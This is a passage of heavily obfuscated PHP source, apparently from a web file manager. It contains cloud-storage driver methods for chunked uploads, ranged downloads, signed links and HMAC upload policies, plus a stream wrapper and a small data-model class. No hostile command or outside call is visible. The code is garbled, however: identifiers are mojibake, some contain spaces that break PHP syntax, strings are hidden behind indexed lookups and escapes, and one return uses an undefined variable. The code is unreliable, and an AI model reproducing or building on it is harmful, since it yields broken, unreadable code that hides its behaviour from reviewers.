$_SERVER[íïàËŸë]; return $ ˜é‚‘ğ[$¤³“…ï[33]] == $¤³“…ï[78]; }); $¨Àîáî¦ = count($ë¤¨É­¬); $ìˆ±¾‰Í = count($ìˆ±¾‰Í); $©§Ù¼Ó½ = $¨Àîáî¦ - $ìˆ±¾‰Í; if ($¹õğ£Ü¿) { $œÆæ¦ï‡ += $ìˆ±¾‰Í; $ÙÅúø†Ò += $©§Ù¼Ó½; if ($¨Àîáî¦ < $ë¯ÃÈÜ) { break; } continue; } if ($ƒÙŒë­Ÿ) { if ($©§Ù¼Ó½) { return !0; } } else { if ($ìˆ±¾‰Í) { return !0; } } if ($¨Àîáî¦ < $ë¯ÃÈÜ) { break; } } if ($¹õğ£Ü¿) { return array($úÖ•Ä™ã[239] => $ÙÅúø†Ò, $úÖ•Ä™ã[240] => $œÆæ¦ï‡); } return !1; } public function listAll($ó¾¤¦»ó) { $Ã¢®˜€µ =& $_SERVER[íïàËŸë]; $äÄçë® = $…ËåòîÙ = array(); $this->fileList($ó¾¤¦»ó, $äÄçë®, $…ËåòîÙ, !0); $éû²ë®– = array_to_keyvalue($…ËåòîÙ, $Ã¢®˜€µ[32]); foreach ($äÄçë® as $­†É¢ç¤) { if (is_string($­†É¢ç¤)) { $éû²ë®–[$­†É¢ç¤] = array($Ã¢®˜€µ[79] => 0); } } return $this->listAllFiles($ó¾¤¦»ó, $éû²ë®–); } public function canRead($ËĞÙ³Ò) { return $this->exist($ËĞÙ³Ò) ? !0 : !1; } public function canWrite($ÂÅ¸š‡) { return $this->exist($ÂÅ¸š‡) ? !0 : !1; } public function getContent($˜¶êË»×) { return $this->fileSubstr($˜¶êË»×, 0, -1); } public function setContent($ãá¥ì, $òÂÊòæƒ = '') { $®©ò³ƒ‰ =& $_SERVER[íïàËŸë]; if (!$òÂÊòæƒ) { $Çû‚ıÀ = $this->ussRequest($ãá¥ì, $®©ò³ƒ‰[257]); return $Çû‚ıÀ[$®©ò³ƒ‰[1308]]; } $Ÿ›½ŸÒ = $this->tempFile($this->pathThis($ãá¥ì)); file_put_contents($Ÿ›½ŸÒ, $òÂÊòæƒ); if ($this->upload($ãá¥ì, $Ÿ›½ŸÒ)) { $this->tempFileRemve($Ÿ›½ŸÒ); return !0; } return !1; } public function fileSubstr($ıø‚ª§è, $¬òûÙÁÖ, $¬ò¯ı) { $ñªü‘…ò =& $_SERVER[íïàËŸë]; if (!($»´ø“¥¹ = $this->link($ıø‚ª§è))) { return !1; } $à¸¨Šá = !1; if ($¬ò¯ı > 0) { $½Í‹¨İ = $¬òûÙÁÖ + $¬ò¯ı - 1; $à¸¨Šá = array($ñªü‘…ò[1544] . $¬òûÙÁÖ . $ñªü‘…ò[462] . $½Í‹¨İ); } $å¥æ¢ÆÏ = url_request($»´ø“¥¹, $ñªü‘…ò[261], !1, $à¸¨Šá); return $å¥æ¢ÆÏ[$ñªü‘…ò[833]] ? $å¥æ¢ÆÏ[$ñªü‘…ò[1298]] : !1; } public function upload($Û‰õ ƒ×, $³‚ì¥Ûü, $ã”‘º ‚ = false, $¯Õ½ÈÊŒ = REPEAT_REPLACE) { $‹ôŸàßì =& $_SERVER[íïàËŸë]; $˜µËÙˆ” = IO::size($³‚ì¥Ûü); if ($˜µËÙˆ” <= 1024 * 1024 * 200) { $Ø™¿óî = array($‹ôŸàßì[1586] . $³‚ì¥Ûü); $Áû¯«¬ç = $this->ussRequest($Û‰õ ƒ×, $‹ôŸàßì[259], $Ø™¿óî); return $Áû¯«¬ç[$‹ôŸàßì[1308]] ? $this->getPathOuter($Û‰õ ƒ×) : !1; } $³µØ¸ÈÚ = 1024 * 1024 * 10; $Íí©‰´ = array($‹ôŸàßì[1587], $‹ôŸàßì[1588] . $˜µËÙˆ”, $‹ôŸàßì[1589], $‹ôŸàßì[1590] . $³µØ¸ÈÚ); $Áû¯«¬ç = $this->ussRequest($Û‰õ ƒ×, $‹ôŸàßì[259], !1, $Íí©‰´); if (!$Áû¯«¬ç[$‹ôŸàßì[1308]]) { return !1; } $Â‹è¸Î˜ = $Áû¯«¬ç[$‹ôŸàßì[1298]]; $‹Ğ“Â‚í = 0; $ŠßşéåÉ = $Â‹è¸Î˜[$‹ôŸàßì[1591]]; $Ù—ŞÁ¸æ = fopen($³‚ì¥Ûü, $‹ôŸàßì[1467]); if (!$Ù—ŞÁ¸æ) { return !1; } do { $Ï¬õŸªæ = $Â‹è¸Î˜[$‹ôŸàßì[1592]]; fseek_64($Ù—ŞÁ¸æ, $‹Ğ“Â‚í); $¿Âç×öÜ = fread($Ù—ŞÁ¸æ, $Ï¬õŸªæ); $äˆ¶·ƒ› = 0; do { $äˆ¶·ƒ›++; $Â‹è¸Î˜ = $this->uploadPart($Û‰õ ƒ×, $Â‹è¸Î˜, $¿Âç×öÜ); } while (!$Â‹è¸Î˜ && $äˆ¶·ƒ› < 3); if (!$Â‹è¸Î˜) { return !1; } $ŠßşéåÉ = $Â‹è¸Î˜[$‹ôŸàßì[1591]]; $‹Ğ“Â‚í += $Ï¬õŸªæ; } while ($ŠßşéåÉ != -1); fclose($Ù—ŞÁ¸æ); $Íí©‰´ = array($‹ôŸàßì[1593], $‹ôŸàßì[1594] . $Â‹è¸Î˜[$‹ôŸàßì[1595]], $‹ôŸàßì[1589]); $Áû¯«¬ç = $this->ussRequest($Û‰õ ƒ×, $‹ôŸàßì[259], !1, $Íí©‰´); return $Áû¯«¬ç[$‹ôŸàßì[1308]] ? $this->getPathOuter($Úãñ¯•ñ) : !1; } private function uploadPart($¢ü¶·€ì, $ÒÍŠÕ£ê, &$±ËÖÑ¾») { $Òî²îà =& $_SERVER[íïàËŸë]; $¸ó§‰Í = array($Òî²îà[1596], $Òî²îà[1594] . $ÒÍŠÕ£ê[$Òî²îà[1595]], $Òî²îà[1597] . $ÒÍŠÕ£ê[$Òî²îà[1591]], $Òî²îà[146] . $ÒÍŠÕ£ê[$Òî²îà[1592]]); $ºËªÍÇõ = $this->ussRequest($¢ü¶·€ì, $Òî²îà[259], $±ËÖÑ¾», $¸ó§‰Í); return !$ºËªÍÇõ[$Òî²îà[1308]] ? $ºËªÍÇõ[$Òî²îà[1308]] : $ºËªÍÇõ[$Òî²îà[1298]]; } public function uploadFormData($®óğ“’Â, $ê‹Ù‡­· = 3600) { return $this->uploadPolicy($®óğ“’Â, $ê‹Ù‡­·); } public function multiUploadFormData($èıÓçíƒ, $¤ğëÀ˜Ÿ = 3600) { $÷ÇœŸôç =& $_SERVER[íïàËŸë]; $­Äâ¢½ = (int) $GLOBALS[$÷ÇœŸôç[7]][$÷ÇœŸôç[79]]; return $this->uploadPolicy($èıÓçíƒ, $¤ğëÀ˜Ÿ, $­Äâ¢½); } private function uploadPolicy($¤ËÀ¦ıÌ, $ğ¸Ğìå² = 3600, $¤€°ûì³ = 0) { $Øİ¤É™Ñ =& $_SERVER[íïàËŸë]; $ï¸…åÒ = $Øİ¤É™Ñ[8] . $this->bucket; $å§¢áçË = gmdate($Øİ¤É™Ñ[1502]); $€Ü¡ö˜º = array($Øİ¤É™Ñ[1598] => $this->bucket, $Øİ¤É™Ñ[1599] => $¤ËÀ¦ıÌ, $Øİ¤É™Ñ[1600] => time() + $ğ¸Ğìå², $Øİ¤É™Ñ[1601] => $å§¢áçË); if ($¤€°ûì³) { $€Ü¡ö˜º[$Øİ¤É™Ñ[1487]] = $¤€°ûì³; } $ ¦Ê§©Í = base64_encode(json_encode($€Ü¡ö˜º)); $©àÓ™Ï = base64_encode(hash_hmac($Øİ¤É™Ñ[1555], "\120\x4f\123\124\46{$ï¸…åÒ}\x26{$å§¢áçË}\46{$ ¦Ê§©Í}", md5("{$this->userpass}"), !0)); $äÕ¯€²â = array($Øİ¤É™Ñ[293] => $ ¦Ê§©Í, $Øİ¤É™Ñ[1602] => "\x55\120\131\125\x4e\x20{$this->username}\x3a{$©àÓ™Ï}", $Øİ¤É™Ñ[208] => $this->endpoint . $ï¸…åÒ); return $äÕ¯€²â; } public function download($ĞŞÈÇª„, $óô¡·°¿) { $ÙÈñÎŒ‡ = IO::getPathInner(IO::mkfile($óô¡·°¿)); if (!($è’ªœø = $this->link($ĞŞÈÇª„))) { return !1; } $ÄöÜ³˜ª = 0; $’”¡¯ç = 1024 * 200; $†ô­á˜å = fopen($ÙÈñÎŒ‡, $_SERVER[íïàËŸë][1550]); while (!0) { $ÅÄû†ú = $this->fileSubstr($ĞŞÈÇª„, $ÄöÜ³˜ª, $’”¡¯ç); if ($ÅÄû†ú === !1) { return !1; } fwrite($†ô­á˜å, $ÅÄû†ú); $ÄöÜ³˜ª += $’”¡¯ç; if (strlen($ÅÄû†ú) < $’”¡¯ç) { break; } } fclose($†ô­á˜å); return $óô¡·°¿; } public function link($ºÜûıÆ§, $”ËåèØ = array()) { $Ü¸—ù÷€ =& $_SERVER[íïàËŸë]; $ºÜûıÆ§ = trim($ºÜûıÆ§, $Ü¸—ù÷€[8]); if (!empty($this->token)) { $øä·ñ¡· = strtotime(date($Ü¸—ù÷€[1603])); $½Ç…²‘ş = substr(md5($this->token . $Ü¸—ù÷€[360] . $øä·ñ¡· . $Ü¸—ù÷€[1604] . $ºÜûıÆ§), 12, 8) . $øä·ñ¡·; $”ËåèØ[] = $Ü¸—ù÷€[1605] . $½Ç…²‘ş; } $ÉÂ—û¥² = !empty($”ËåèØ) ? $Ü¸—ù÷€[76] . implode($Ü¸—ù÷€[360], $”ËåèØ) : $Ü¸—ù÷€[12]; return $this->getHost() . $Ü¸—ù÷€[8] . $ºÜûıÆ§ . $ÉÂ—û¥²; } public function fileOut($›­äİŞ¥, $Â—µş¾Ã = false, $ÉÜığ™Ñ = false, $‚®å‰ÂÓ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($›­äİŞ¥, $Â—µş¾Ã, $ÉÜığ™Ñ, $‚®å‰ÂÓ); } if (!$ÉÜığ™Ñ) { $ÉÜığ™Ñ = $this->pathThis($›­äİŞ¥); } $å§ŸÁá¶ = $Â—µş¾Ã ? array($_SERVER[íïàËŸë][1606] . rawurlencode($ÉÜığ™Ñ)) : array(); $ñ‘³´‡¼ = $this->link($›­äİŞ¥, $å§ŸÁá¶); $this->fileOutLink($ñ‘³´‡¼); } public function fileOutServer($÷šğ‘±š, $è±Îëµ = false, $ƒ°‘É¡Š = false, $ô€‰—Åç = '') { parent::fileOut($÷šğ‘±š, $è±Îëµ, $ƒ°‘É¡Š, $ô€‰—Åç); } public function fileOutImage($ØÊÇ¾ƒñ, $Ï¾°š¢’ = 250) { $ÊÈéí‡ = $this->link($ØÊÇ¾ƒñ . $_SERVER[íïàËŸë][1607] . $Ï¾°š¢’); $this->fileOutLink($ÊÈéí‡); } public function fileOutImageServer($ø‘«êÙ, $­œÎÇŒİ = 250) { parent::fileOutImage($ø‘«êÙ, $­œÎÇŒİ); } public function hashMd5($®±œñï) { $ò í×±À =& $_SERVER[íïàËŸë]; $á×ëûçû = $this->_objectMeta($®±œñï); return isset($á×ëûçû[$ò í×±À[245]]) ? $á×ëûçû[$ò í×±À[245]] : !1; } public function size($†ş­õÛ‰) { $ËÒ¶Ğ·å = $this->objectMeta($†ş­õÛ‰); return $ËÒ¶Ğ·å ? $ËÒ¶Ğ·å[$_SERVER[íïàËŸë][79]] : 0; } public function info($•ÊÂ®¹­) { if ($this->isFolder($•ÊÂ®¹­)) { return $this->folderInfo($•ÊÂ®¹­); } else { if ($this->isFile($•ÊÂ®¹­)) { return $this->fileInfo($•ÊÂ®¹­); } } return !1; } public function exist($ĞÜŒ‡½Ï) { return $this->isFile($ĞÜŒ‡½Ï) || $this->isFolder($ĞÜŒ‡½Ï); } public function isFile($ØÊ¤†ø) { return !$this->isFolder($ØÊ¤†ø) && $this->objectMeta($ØÊ¤†ø); } public function isFolder($Ñ¯ßøı®) { return $this->cacheMethod($_SERVER[íïàËŸë][179], $Ñ¯ßøı®); } protected function objectMeta($§ä©üâ) { return $this->cacheMethod($_SERVER[íïàËŸë][181], $§ä©üâ); } protected function _objectMeta($œÕ¤›—ò) { $‡˜ÓÙÑ— =& $_SERVER[íïàËŸë]; if ($œÕ¤›—ò == $‡˜ÓÙÑ—[12] || $œÕ¤›—ò == $‡˜ÓÙÑ—[8]) { return array(); } $Ì¶áÄë = $this->ussRequest($œÕ¤›—ò, $‡˜ÓÙÑ—[1608]); if (!$Ì¶áÄë[$‡˜ÓÙÑ—[1308]]) { return null; } $ˆ†Ó†¹§ = isset($Ì¶áÄë[$‡˜ÓÙÑ—[1298]]) ? $Ì¶áÄë[$‡˜ÓÙÑ—[1298]] : array(); if (!isset($ˆ†Ó†¹§[$‡˜ÓÙÑ—[1609]])) { return null; } $ÆÁñ˜€Â = array($‡˜ÓÙÑ—[33] => isset($ˆ†Ó†¹§[$‡˜ÓÙÑ—[1609]]) ? $ˆ†Ó†¹§[$‡˜ÓÙÑ—[1609]] : null, $‡˜ÓÙÑ—[79] => isset($ˆ†Ó†¹§[$‡˜ÓÙÑ—[1610]]) ? $ˆ†Ó†¹§[$‡˜ÓÙÑ—[1610]] : null, $‡˜ÓÙÑ—[245] => isset($ˆ†Ó†¹§[$‡˜ÓÙÑ—[1611]]) ? $ˆ†Ó†¹§[$‡˜ÓÙÑ—[1611]] : null, $‡˜ÓÙÑ—[1578] => isset($ˆ†Ó†¹§[$‡˜ÓÙÑ—[1612]]) ? $ˆ†Ó†¹§[$‡˜ÓÙÑ—[1612]] : null); $ÆÁñ˜€Â[$‡˜ÓÙÑ—[1579]] = isset($ˆ†Ó†¹§[$‡˜ÓÙÑ—[1613]]) ? strtotime($ˆ†Ó†¹§[$‡˜ÓÙÑ—[1613]]) : $ÆÁñ˜€Â[$‡˜ÓÙÑ—[1578]]; return $ÆÁñ˜€Â; } protected function _isFolder($úçßÑø¨) { $îÑ½É˜Ü =& $_SERVER[íïàËŸë]; if ($úçßÑø¨ == $îÑ½É˜Ü[12] || $úçßÑø¨ == $îÑ½É˜Ü[8]) { return !0; } $ÍÎÜ¾ğ = $this->_objectMeta($úçßÑø¨); return isset($ÍÎÜ¾ğ[$îÑ½É˜Ü[33]]) && $ÍÎÜ¾ğ[$îÑ½É˜Ü[33]] == $îÑ½É˜Ü[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($È…ï¦ ş = false) { } public function exist($¶ŸüÄ›Û) { $ƒÌ¬ì¯ = $this->info($¶ŸüÄ›Û); return $ƒÌ¬ì¯[$_SERVER[íïàËŸë][232]]; } public function isFile($›³™®ûã) { $©©÷Ôä = $this->info($›³™®ûã); return $©©÷Ôä[$_SERVER[íïàËŸë][232]]; } public function isFolder($Şè±ê¤é) { return !1; } public function size($•Ò ¤Ì) { $Áøœªş¦ = $this->info($•Ò ¤Ì); return $Áøœªş¦[$_SERVER[íïàËŸë][79]]; } public function info($´ŸñÒĞ) { return $this->infoParse($´ŸñÒĞ); } public function infoAuth($ßË¢¿‡´) { return $this->infoParse($ßË¢¿‡´); } public function infoWithChildren($÷©¬³·) { return $this->infoParse($÷©¬³·); } public function infoFull($úòÃº¿ì) { return $this->infoParse($úòÃº¿ì); } private function infoParse($Æª¦•‰½) { $òÌ™Ò×Ø =& $_SERVER[íïàËŸë]; $ç†Û‘å = $this->header($Æª¦•‰½); if (!$ç†Û‘å || !$ç†Û‘å[$òÌ™Ò×Ø[833]]) { return !1; } $¹îü·¾ = _get($ç†Û‘å, $òÌ™Ò×Ø[413], 0); $‹ş¼¶ÅÂ = array($òÌ™Ò×Ø[32] => $ç†Û‘å[$òÌ™Ò×Ø[32]], $òÌ™Ò×Ø[87] => $Æª¦•‰½, $òÌ™Ò×Ø[33] => $òÌ™Ò×Ø[230], $òÌ™Ò×Ø[79] => intval($¹îü·¾), $òÌ™Ò×Ø[169] => get_path_ext($ç†Û‘å[$òÌ™Ò×Ø[32]]), $òÌ™Ò×Ø[1464] => $¹îü·¾ > 0 && $ç†Û‘å[$òÌ™Ò×Ø[1614]], $òÌ™Ò×Ø[1465] => !1); return $‹ş¼¶ÅÂ; } private function header($µµ¬ßç®) { $Ø«³Šıš =& $_SERVER[íïàËŸë]; if (isset(self::$_cacheHeader[$µµ¬ßç®])) { return self::$_cacheHeader[$µµ¬ßç®]; } $º¯ÀŸê¸ = isset($GLOBALS[$Ø«³Šıš[1615]]) ? $GLOBALS[$Ø«³Šıš[1615]] : !1; $GLOBALS[$Ø«³Šıš[1615]] = !0; self::$_cacheHeader[$µµ¬ßç®] = url_header($µµ¬ßç®); $GLOBALS[$Ø«³Šıš[1615]] = $º¯ÀŸê¸; return self::$_cacheHeader[$µµ¬ßç®]; } public function hashSimple($äğ¤«†ˆ, $ÂøüõÛ˜ = false) { $œ…©œ— =& $_SERVER[íïàËŸë]; $¬ŞÇÆ€» = $this->info($äğ¤«†ˆ); if (!$¬ŞÇÆ€» || !$¬ŞÇÆ€»[$œ…©œ—[232]]) { return !1; } $ÀÛ‹Ä = $¬ŞÇÆ€»[$œ…©œ—[79]]; $ÃŸ’ô ì = 200; $Øû‹††Ğ = 50; if ($ÀÛ‹Ä <= $ÃŸ’ô ì * $Øû‹††Ğ) { return md5($this->fileSubstr($äğ¤«†ˆ, 0, $ÀÛ‹Ä)) . $ÀÛ‹Ä; } $üŠšôÆ® = intval($ÀÛ‹Ä / $Øû‹††Ğ); $‘Ãş°ûä = $œ…©œ—[12]; $ş“ôñ›é = timeFloat(); $‘Üñ¤‡ê = 15; for ($¯à¯šÖ­ = 0; $¯à¯šÖ­ < $Øû‹††Ğ; $¯à¯šÖ­++) { if (timeFloat() - $ş“ôñ›é > $‘Üñ¤‡ê) { return !1; } $•°õÍá = $this->fileSubstr($äğ¤«†ˆ, $üŠšôÆ® * $¯à¯šÖ­, $ÃŸ’ô ì); if (!$•°õÍá) { return !1; } $‘Ãş°ûä .= $•°õÍá; } $‘Ãş°ûä .= $this->fileSubstr($äğ¤«†ˆ, $ÀÛ‹Ä - $ÃŸ’ô ì, $ÃŸ’ô ì); return md5($‘Ãş°ûä) . $ÀÛ‹Ä; } public function getContent($£˜Ì „Í) { return $this->fileSubstr($£˜Ì „Í); } public function fileSubstr($ç´  õ¼, $Ù‘Ó„ä‚ = 0, $·ÃìÙ¿Ì = -1) { $¨ª¶™ßã =& $_SERVER[íïàËŸë]; $ããûáŞ± = $this->info($ç´  õ¼); if (!$ããûáŞ± || !$ããûáŞ±[$¨ª¶™ßã[232]] && $ããûáŞ±[$¨ª¶™ßã[79]] > 1024 * 1024 * 10) { return !1; } if ($·ÃìÙ¿Ì === -1) { $·ÃìÙ¿Ì = $ããûáŞ±[$¨ª¶™ßã[79]]; } if ($·ÃìÙ¿Ì == 0) { return $¨ª¶™ßã[12]; } $£œİ‹í = array($¨ª¶™ßã[1616] . $Ù‘Ó„ä‚ . $¨ª¶™ßã[868] . ($Ù‘Ó„ä‚ + $·ÃìÙ¿Ì - 1)); $³÷»ƒŠ÷ = url_request($ç´  õ¼, $¨ª¶™ßã[261], !1, $£œİ‹í, !1, !1, 30); return $³÷»ƒŠ÷[$¨ª¶™ßã[1298]] ? $³÷»ƒŠ÷[$¨ª¶™ßã[1298]] : $¨ª¶™ßã[12]; } public function download($¾¾ÍÚïÍ, $âéšöùÌ) { Downloader::start($¾¾ÍÚïÍ, $âéšöùÌ); return $âéšöùÌ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ØøœÑ–í, $è ¼ğÍ = '') { $this->info = $this->info($ØøœÑ–í); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[íïàËŸë][87]]; $this->pathOpen = $ØøœÑ–í; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ØøœÑ–í])) { self::$_chunkBuffer[$ØøœÑ–í] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Ï›å¹ñà) { $•õÈƒ´ƒ = $this->fileSubstr($this->pose, $Ï›å¹ñà); $this->pose += strlen($•õÈƒ´ƒ); return $•õÈƒ´ƒ; } public function stream_tell() { return $this->pose; } public function stream_seek($§«ÍÏ½ù, $–¡»‚îê) { $º“×„ø =& $_SERVER[íïàËŸë]; if ($–¡»‚îê == SEEK_SET) { $this->pose = $§«ÍÏ½ù; } else { if ($–¡»‚îê == SEEK_CUR) { $this->pose += $§«ÍÏ½ù; } else { if ($–¡»‚îê == SEEK_END) { $this->pose = $this->info[$º“×„ø[79]] + intval($§«ÍÏ½ù); } } } if ($§«ÍÏ½ù < 0) { $this->pose = $this->info[$º“×„ø[79]] + $§«ÍÏ½ù; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[íïàËŸë][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($í¸‚ÄæÕ, $€Ñá’«×) { $½µüÊĞá =& $_SERVER[íïàËŸë]; $€ûÌÖ¹ˆ = $this->info($í¸‚ÄæÕ); return array($½µüÊĞá[1617] => 0, $½µüÊĞá[1618] => 0, $½µüÊĞá[16] => 32768 + 511, $½µüÊĞá[1619] => 0, $½µüÊĞá[1620] => 0, $½µüÊĞá[1621] => 0, $½µüÊĞá[1622] => 0, $½µüÊĞá[79] => $€ûÌÖ¹ˆ[$½µüÊĞá[79]], $½µüÊĞá[1623] => $€ûÌÖ¹ˆ[$½µüÊĞá[1463]], $½µüÊĞá[1579] => $€ûÌÖ¹ˆ[$½µüÊĞá[88]], $½µüÊĞá[1578] => $€ûÌÖ¹ˆ[$½µüÊĞá[231]], $½µüÊĞá[1624] => 0, $½µüÊĞá[1625] => 0); } static $fileInfo = array(); public function info($è‘äş§æ) { $ê˜«Ñ ® = $_SERVER[íïàËŸë][1626]; if (isset(self::$fileInfo[$è‘äş§æ])) { return self::$fileInfo[$è‘äş§æ]; } if (substr($è‘äş§æ, 0, strlen($ê˜«Ñ ®)) != $ê˜«Ñ ®) { return !1; } self::$fileInfo[$è‘äş§æ] = IO::info(substr($è‘äş§æ, strlen($ê˜«Ñ ®))); return self::$fileInfo[$è‘äş§æ]; } public static function read($îµïü÷, $Î®¥ã”, $íû“«ŒŞ) { if (!isset(self::$_fopenCache[$îµïü÷])) { $¨É©Ë¦Ç = new StreamWrapperIO(); $¨É©Ë¦Ç->stream_open($îµïü÷); self::$_fopenCache[$îµïü÷] = $¨É©Ë¦Ç; } $¨É©Ë¦Ç = self::$_fopenCache[$îµïü÷]; return $¨É©Ë¦Ç->fileSubstr($Î®¥ã”, $íû“«ŒŞ); } public static function _read($é£ß£•Ò, $åßĞ…÷Ù, $âƒ’ ¨¬) { $ÉŒåùõ =& $_SERVER[íïàËŸë]; $ØË•ŞŠè = fopen($é£ß£•Ò, $ÉŒåùõ[1467]); if (!$ØË•ŞŠè) { return $ÉŒåùõ[12]; } $´§¶óÀß = 8192; fseek($ØË•ŞŠè, $åßĞ…÷Ù, SEEK_SET); $­–ıŠüÒ = $ÉŒåùõ[12]; $¯Ö’è½‘ = 0; while ($¯Ö’è½‘ < $âƒ’ ¨¬) { $ÌàÙÃÂ‚ = min($´§¶óÀß, $âƒ’ ¨¬ - $¯Ö’è½‘); $­–ıŠüÒ .= fread($ØË•ŞŠè, $ÌàÙÃÂ‚); $¯Ö’è½‘ += $ÌàÙÃÂ‚; } fclose($ØË•ŞŠè); return $­–ıŠüÒ; } public function fileSubstr($ªÅ¦Şú, $âÊ¦åòÑ) { $‚ĞçÑú¦ =& $_SERVER[íïàËŸë]; $’»ıÇ– = $this->info[$‚ĞçÑú¦[79]]; $¯ëÄ ªŒ = $ªÅ¦Şú; $¨¬Â‹ìà = $âÊ¦åòÑ; if ($ªÅ¦Şú < 0) { $ªÅ¦Şú = $’»ıÇ– + $ªÅ¦Şú; } if ($âÊ¦åòÑ === !1) { $âÊ¦åòÑ = $’»ıÇ– - $ªÅ¦Şú; } if ($ªÅ¦Şú + $âÊ¦åòÑ > $’»ıÇ–) { $âÊ¦åòÑ = $’»ıÇ– - $ªÅ¦Şú; } if ($âÊ¦åòÑ <= 0) { return $‚ĞçÑú¦[12]; } if ($ªÅ¦Şú < 0 || $ªÅ¦Şú >= $’»ıÇ– || $âÊ¦åòÑ <= 0 || $âÊ¦åòÑ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\x69\x6c\145\x52\145\x61\144\x20\x65\162\x72\x6f\162\41\40\163\x74\x61\162\x74\x3d{$ªÅ¦Şú}\x3b\154\x65\x6e\x67\164\x68\x3d{$âÊ¦åòÑ}\x3b\40\x73\x69\172\x65\x3d{$’»ıÇ–}\73"); } $Üú¤í˜™ = 64 * 1024; $æ¯áØ÷Â =& self::$_chunkBuffer[$this->path]; if (!$æ¯áØ÷Â) { $æ¯áØ÷Â = array(); } $à ÈéÍÕ = 0; $÷±¥ºáâ = 0; $é‘Â«ß = $‚ĞçÑú¦[12]; foreach ($æ¯áØ÷Â as $à ÈéÍÕ => $é‘Â«ß) { $à ÈéÍÕ = intval($à ÈéÍÕ); $÷±¥ºáâ = $à ÈéÍÕ + strlen($é‘Â«ß); if ($ªÅ¦Şú >= $÷±¥ºáâ) { continue; } if ($ªÅ¦Şú >= $à ÈéÍÕ && $ªÅ¦Şú + $âÊ¦åòÑ <= $÷±¥ºáâ) { return substr($é‘Â«ß, $ªÅ¦Şú - $à ÈéÍÕ, $âÊ¦åòÑ); } break; } if (count($æ¯áØ÷Â) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($‚ĞçÑú¦[1627], $‚ĞçÑú¦[1628] . count($æ¯áØ÷Â) . "\73\x73\164\141\x72\164\75{$ªÅ¦Şú}\x2c\x6c\145\156\147\x74\x68\x3d{$âÊ¦åòÑ}\73\x70\157\x73\x65\x3a{$à ÈéÍÕ}\176{$÷±¥ºáâ}"); throw new Exception($‚ĞçÑú¦[1629]); } $ó—û€Æõ = intval($ªÅ¦Şú / $Üú¤í˜™) * $Üú¤í˜™; $ü„şÎ‘ = ceil(($ªÅ¦Şú + $âÊ¦åòÑ) / $Üú¤í˜™) * $Üú¤í˜™ - $ó—û€Æõ; $«ôãèı¬ = IO::fileSubstr($this->path, $ó—û€Æõ, $ü„şÎ‘); $æ¯áØ÷Â[$ó—û€Æõ . $‚ĞçÑú¦[12]] = $«ôãèı¬; ksort($æ¯áØ÷Â); $î™ÊÎÃ = substr($«ôãèı¬, $ªÅ¦Şú - $ó—û€Æõ, $âÊ¦åòÑ); return $î™ÊÎÃ; } private function log($ åüîâÜ, $¤Ş¹¸ã¦) { $“ûÂ„ï =& $_SERVER[íïàËŸë]; $ëıèö¼¶ = timeFloat() - $this->timeStart; write_log(sprintf($“ûÂ„ï[1630], $ åüîâÜ, $this->info[$“ûÂ„ï[32]], $ëıèö¼¶, $¤Ş¹¸ã¦), $“ûÂ„ï[1275]); } } goto E¼†¶‚ì›Œ; D¾§Ùğñ×: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\x65\155\x4f\x70\x74\x69\157\156"; public $field = array(); public function listData($†…¼Ó¬ş = false, $ÍÊĞ–¹‘ = "\155\x6f\144\x69\x66\171\x54\151\155\x65", $Ş‰ºè¾ê = false) { $ì‘£¿Ã¯ = Model($this->modelType)->get(!1, $this->optionType, !0); $‘Ñ¢ŸâÖ = array_values($ì‘£¿Ã¯); if ($‘Ñ¢ŸâÖ && $‘Ñ¢ŸâÖ[0] && !is_array($‘Ñ¢ŸâÖ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ì‘£¿Ã¯ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ì‘£¿Ã¯) { return $†…¼Ó¬ş ? null : array(); } if (!$†…¼Ó¬ş) { $ì‘£¿Ã¯ = array_filter(array_values($ì‘£¿Ã¯)); return array_sort_by($ì‘£¿Ã¯, $ÍÊĞ–¹‘, $Ş‰ºè¾ê); } return $ì‘£¿Ã¯[$_SERVER[íïàËŸë][472] . $†…¼Ó¬ş]; } public function insert($î—®ôØ³) { $ª¡˜½²ã =& $_SERVER[íïàËŸë]; $î—®ôØ³ = array_field_key($î—®ôØ³, $this->field); $™¬Ã¶Ï¯ = Model($this->modelType)->get($ª¡˜½²ã[473], $this->optionType . $ª¡˜½²ã[474]); $™¬Ã¶Ï¯ = $™¬Ã¶Ï¯ ? $™¬Ã¶Ï¯ : 0; $î—®ôØ³[$ª¡˜½²ã[475]] = ++$™¬Ã¶Ï¯; $î—®ôØ³[$ª¡˜½²ã[231]] = time(); $î—®ôØ³[$ª¡˜½²ã[88]] = time(); Model($this->modelType)->set($ª¡˜½²ã[473], $™¬Ã¶Ï¯, $this->optionType . $ª¡˜½²ã[474]); Model($this->modelType)->set($ª¡˜½²ã[472] . $™¬Ã¶Ï¯, $î—®ôØ³, $this->optionType); return $™¬Ã¶Ï¯; } public function update($ëªÖèÀ«, $óŠ…Ş§Ú) { $Ó‰ëãœÒ =& $_SERVER[íïàËŸë]; $óŠ…Ş§Ú = array_field_key($óŠ…Ş§Ú, $this->field); $Ë³«­»¯ = $this->listData($ëªÖèÀ«); if (!$Ë³«­»¯ || !$ëªÖèÀ«) { return !1; } $óŠ…Ş§Ú = array_merge($Ë³«­»¯, $óŠ…Ş§Ú); $óŠ…Ş§Ú[$Ó‰ëãœÒ[88]] = time(); return Model($this->modelType)->set($Ó‰ëãœÒ[472] . $ëªÖèÀ«, $óŠ…Ş§Ú, $this->optionType); } public function remove($ŞñâÛÄ) { if (!$ŞñâÛÄ) { return !1; } return Model($this->modelType)->remove($_SERVER[íïàËŸë][472] . $ŞñâÛÄ, $this->optionType); } public function clear() { $¹¡’”† =& 